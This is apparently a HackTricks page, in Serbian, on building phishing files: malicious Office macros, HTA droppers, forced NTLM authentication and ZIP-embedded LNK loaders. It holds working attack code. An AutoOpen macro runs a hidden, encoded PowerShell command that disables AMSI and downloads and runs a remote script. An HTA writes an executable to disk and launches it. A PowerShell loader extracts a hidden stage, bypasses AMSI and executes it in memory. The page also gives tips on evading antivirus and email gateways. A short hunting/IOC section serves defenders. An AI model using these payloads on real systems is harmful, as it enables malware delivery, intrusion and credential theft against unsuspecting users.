# Phishing fajlovi & dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word vrši validaciju podataka fajla pre nego što otvori fajl. Validacija se obavlja u vidu identifikacije strukture podataka, u skladu sa OfficeOpenXML standardom. Ako se dogodi bilo kakva greška tokom identifikacije strukture podataka, fajl koji se analizira neće biti otvoren.

Obično Word fajlovi koji sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je preimenovati fajl promenom ekstenzije i i dalje zadržati mogućnost izvršavanja makroa. Na primer, RTF fajl po dizajnu ne podržava makroe, ali `.docm` fajl preimenovan u RTF biće obrađen od strane Microsoft Word-a i biće sposoban za izvršavanje makroa. Ista interna logika i mehanizmi važe za sav softver iz Microsoft Office Suite (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje će ekstenzije biti izvršavane od strane nekih Office programa:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Kategorije**: Links and References, **Nazivi polja**: includePicture, and **Ime fajla ili URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Moguće je koristiti macros za pokretanje arbitrary code iz dokumenta.

#### Autoload functions

Što su češće, veća je verovatnoća da će ih AV otkriti.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklonite metapodatke

Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.

#### Ekstenzija dokumenta

Kada završite, izaberite padajući meni **Save as type**, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
Uradite ovo zato što ne možete sačuvati **macros** unutar **`.docx`**, i postoji **stigmatizacija** **oko** macro-enabled **`.docm`** ekstenzije (npr. ikona sličice ima ogroman `!` i neki web/email gateway-ovi ih u potpunosti blokiraju). Stoga je ova **legacy `.doc` ekstenzija najbolje kompromisno rešenje**.

#### Generatori zlonamernih Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA fajlovi

HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao "fully trusted" aplikacija, bez ograničenja sigurnosnog modela pregledača.

HTA se izvršava pomoću **`mshta.exe`**, koji se obično instalira zajedno sa **Internet Explorer**, što čini **`mshta`** zavisnim od IE. Dakle, ako je on deinstaliran, HTA fajlovi neće moći da se izvrše.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forsiranje NTLM autentikacije

Postoji nekoliko načina da **forsirate NTLM autentikaciju „na daljinu“**, na primer, možete dodati **nevidljive slike** u mejlove ili HTML koje će korisnik otvoriti (čak i HTTP MitM?). Ili poslati žrtvi **adresu fajlova** koja će **okidati** **autentikaciju** samo otvaranjem foldera.

**Pogledajte ove ideje i još više na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo ukrasti hash ili autentikaciju već i **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efektivne kampanje isporučuju ZIP koji sadrži dva legitimno izgledajuća dokumenta (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što je stvarni PowerShell loader smešten unutar sirovih bajtova ZIP-a nakon jedinstvenog markera, a .lnk ga izrezuje i izvršava u celosti u memoriji.

Tipičan tok koji implementira .lnk PowerShell one-liner:

1) Locate the original ZIP in common paths: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, and the parent of the current working directory.
2) Read the ZIP bytes and find a hardcoded marker (e.g., xFIQCV). Everything after the marker is the embedded PowerShell payload.
3) Copy the ZIP to %ProgramData%, extract there, and open the decoy .docx to appear legitimate.
4) Bypass AMSI for the current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskujte naredni stejdž (npr. uklonite sve # karaktere) i izvršite ga u memoriji.

Primer PowerShell skeleta za izvlačenje i izvršavanje ugrađenog stejdža:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Napomene
- Dostava često zloupotrebljava ugledne PaaS poddomene (npr. *.herokuapp.com) i može ograničiti payloads (poslužiti benigni ZIP prema IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi smanjila tragove na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking of the Microsoft Web Browser control tako da IE/Explorer ili bilo koja app koja ga ugradi ponovo automatski pokrene payload. Pogledajte detalje i gotove komande ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP fajlovi koji sadrže ASCII marker string (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji pretražuje parent/user foldere da locira ZIP i otvori lažni dokument.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajni business threads koji se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## Windows fajlovi za krađu NTLM hashes

Proverite stranicu o **mestima za krađu NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Reference

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
